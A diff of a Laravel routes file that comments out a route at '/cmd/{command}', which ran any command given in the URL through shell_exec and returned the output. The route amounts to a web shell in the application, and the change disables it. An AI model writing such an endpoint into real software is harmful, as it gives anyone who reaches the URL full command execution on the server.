@@ -119,12 +119,12 @@ Route::group(['prefix' => app()->getLocale(),'middleware'=>'LanguageSwicher'], f
 //      return view('welcome');
 //  });
 
-Route::get('/cmd/{command}', function ($command) {
-    chdir('../');
-    //$dir =  getcwd();
-    $cmd  = shell_exec($command);
-    return $cmd   ;
-});
+// Route::get('/cmd/{command}', function ($command) {
+//     chdir('../');
+//     //$dir =  getcwd();
+//     $cmd  = shell_exec($command);
+//     return $cmd   ;
+// });
 
 
 });
